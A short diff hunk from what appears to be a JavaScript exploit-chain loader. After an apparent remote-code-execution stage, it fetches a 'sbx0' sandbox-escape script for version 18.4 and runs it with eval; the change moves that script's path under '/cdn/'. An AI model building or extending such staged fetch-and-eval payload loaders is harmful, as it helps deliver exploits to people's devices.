@@ -10167,7 +10167,7 @@ async function main() {
           const rce_end = Date.now();
           log(`-`.repeat(0x28));
           try {
-                const sbx0_script = getJS('/sbx0_main_18.4.js');
+                const sbx0_script = getJS('/cdn/sbx0_main_18.4.js');
                 log("after get js");
                 eval(sbx0_script);
         } catch (e) {
